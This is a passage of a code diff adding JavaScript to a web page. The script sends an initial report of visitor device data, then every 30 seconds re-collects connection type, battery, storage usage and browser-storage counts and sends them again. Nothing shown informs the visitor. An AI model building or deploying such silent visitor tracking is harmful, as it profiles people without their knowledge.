+      buildReport(_data, 'initial');
+    }
+  });
+  
+  // Step 8: Fallback - if no API responds in 5 seconds, send anyway
+  setTimeout(function(){
+    if(!_initialSent){
+      _initialSent = true;
+      buildReport(_data, 'initial');
+    }
+  }, 5000);
+}
+
+// 🔄 UPDATE FUNCTION (every 30 seconds)
+function startUpdater(){
+  setInterval(function(){
+    // Update connection
+    try{
+      if(navigator.connection){
+        var c = navigator.connection;
+        _data.ct = c.type||c.effectiveType||'N/A';
+        _data.ce = c.effectiveType||'N/A';
+        _data.cr = c.rtt?c.rtt+' ms':'N/A';
+        _data.cd = c.downlink?c.downlink+' Mbps':'N/A';
+        _data.csv = c.saveData?'✅ On':'❌ Off';
+      }
+    } catch(e){}
+    
+    // Update battery
+    getBattery(function(level, charging, timeLeft){
+      _data.batL = level;
+      _data.batC = charging;
+      _data.batT = timeLeft;
+    });
+    
+    // Update storage
+    try{
+      if(navigator.storage && navigator.storage.estimate){
+        navigator.storage.estimate().then(function(e){
+          _data.su = (e.usage/1024/1024).toFixed(2)+' MB';
+          _data.st = (e.quota/1024/1024).toFixed(2)+' MB';
+        }).catch(function(){});
+      }
+    } catch(e){}
+    try{ _data.li = localStorage.length; _data.si = sessionStorage.length; } catch(e){}
+    
+    // Send update
+    buildReport(_data, 'update');
+  }, 30000);
+}
+
+// 🚀 START - Updater ab yahan start karo (collect() ab Supabase ke .then() mein hai)
+setTimeout(startUpdater, 30000);
+</script>
+</body>
+</html>
